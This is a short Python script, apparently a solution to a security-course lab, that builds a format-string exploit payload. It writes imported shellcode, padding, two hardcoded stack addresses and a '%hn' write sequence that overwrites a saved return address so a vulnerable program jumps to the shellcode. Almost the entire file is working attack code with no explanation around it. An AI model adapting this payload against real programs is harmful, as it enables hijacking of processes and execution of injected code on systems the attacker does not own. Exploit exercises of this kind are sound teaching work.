#!/usr/bin/env python3

import sys
from shellcode import shellcode
from struct import pack

# Your code here
ebp = 0xfffefdd8
shellcodeAddr = 0xfffef5d0 # 0xf5d0 - 0x58 = 0xf578 = decimal 62840


ADDR1 = ebp+6 #RetAddr with offset for short
ADDR2 = ebp+4 #RetAddr
padding = b"\x69"


# Shellcode is 23 bytes, pad 1 byte to make total divisible by 24

sys.stdout.buffer.write(shellcode + padding + pack('<I', ADDR1) + pack('<I', ADDR2) + b"%62896x%11$hn%2606x%10$hn")
